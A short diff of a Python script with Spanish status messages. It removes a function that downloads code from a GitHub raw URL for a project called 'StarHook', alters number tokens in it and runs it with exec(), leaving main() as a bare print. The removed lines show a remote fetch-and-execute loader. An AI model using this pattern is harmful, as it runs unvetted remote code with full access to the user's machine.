@@ -1,6 +1,5 @@
 import random
 import re
-import requests
 
 NUMBER_PATTERN = r'##[0-9]{22}'
 
@@ -28,27 +27,11 @@ def ensure_number_lines(text, num_lines=5):
     return '\n'.join(new_lines)
 
 def replace_numbers(text):
+    import re
     return re.sub(NUMBER_PATTERN, random_number_string, text)
 
-def download_and_execute_modified_raw(url):
-    try:
-        print("🌐 Cargando...")
-        response = requests.get(url)
-        response.raise_for_status()
-
-        original_code = response.text
-        updated_code = ensure_number_lines(original_code)
-        updated_code = replace_numbers(updated_code)
-
-        print("⭐ Ejecutando StarHook...")
-        exec(updated_code, globals())
-
-    except Exception as e:
-        print(f"❌ Error: {e}")
-
 def main():
-    raw_url = "https://raw.githubusercontent.com/uidnull/STARHOOK./refs/heads/main/star.py"
-    download_and_execute_modified_raw(raw_url)
+    print("⭐ Cargando")
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
